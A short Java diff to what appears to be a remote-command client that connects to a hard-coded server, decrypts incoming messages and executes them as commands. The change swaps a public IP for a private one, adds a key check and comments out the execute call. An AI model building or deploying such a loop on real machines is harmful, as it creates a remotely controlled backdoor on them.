@@ -16,7 +16,7 @@ public class Main {
 		Sockets sockets = new Sockets();
 		Commands commands = new Commands();
 		Messages messages = new Messages();
-		sockets.createSocket("104.236.115.100", 4095);
+		sockets.createSocket("10.101.44.12", 4095);
 		while (true)
 		{
 			String encryptedMessage = sockets.receiveMessage();
@@ -29,7 +29,11 @@ public class Main {
 			{
 				e.printStackTrace();
 			}
-			commands.executeCommand(commands.parseCommand(decryptedMessage));
+			JSONObject jobj = messages.getJSONObject(decryptedMessage);
+			if (messages.testKey(jobj))
+			{
+				//commands.executeCommand(commands.parseCommand(commands.getCommandToExecute(jobj)));
+			}
 		}
 	}
 }
